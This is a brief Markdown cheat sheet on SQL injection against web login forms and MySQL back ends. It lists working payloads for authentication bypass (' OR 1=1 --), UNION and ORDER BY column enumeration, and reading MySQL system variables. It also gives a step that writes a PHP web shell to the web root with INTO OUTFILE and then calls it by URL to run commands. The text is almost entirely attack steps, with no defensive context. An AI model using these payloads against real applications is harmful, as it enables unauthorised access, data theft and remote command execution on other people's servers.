# SQL Injection

* Cause Error on the Web Application by input quote '

```text
SELECT * FROM users WHERE username = ''' AND password = ''
```

* Data Exfiltration by input ' OR 1=1 --

```text
SELECT * FROM users WHERE username = '' OR 1=1--' AND password = ''
```

* Gaining Shell

First check the number of column with NULL or 1

```text
SELECT * FROM users WHERE username = 'a' UNION SELECT NULL, NULL; --' AND password = ''
```

Use the INTO FILE to create a php file in the web server

```text
SELECT * FROM users WHERE username = 'a' 
UNION SELECT “<? system($_REQUEST[‘cmd’]); ?>”, NULL INTO OUTFILE 'var/www/cmd.php';--' AND password = ''
```

Access the web page

```text
http://yourIPaddress/cmd.php?=[command]
```

## SQL Injection Basic Techniques

Check number of columns by order by

```text
' ORDER BY 1;#
' ORDER BY 2;#
' ORDER BY 3;#
```

Check the field appear

```text
' & 0 union select 1,2,3;#
```

IF the developer only allow one row

```text
' & 1 union select 1,2,3;#
```

MySQL database schema

```text
Variable/Function        Output
@@hostname    :    Current Hostname
@@tmpdir    :    Tept Directory
@@datadir    :    Data Directory
@@version    :    Version of DB
@@basedir    :    Base Directory
user()    :    Current User
database()    :    Current Database
version()    :    Version
schema()    :    current Database
UUID()    :    System UUID key
current_user()    :    Current User
current_user    :    Current User
system_user()    :    Current Sustem user
session_user()    :    Session user
@@GLOBAL.have_symlink    :    Check if Symlink Enabled or Disabled
@@GLOBAL.have_ssl    :    Check if it have ssl or not
```

Can use follow query to display \(Example\)

```text
' & 1 union select 1,@@hostname,3;#
```

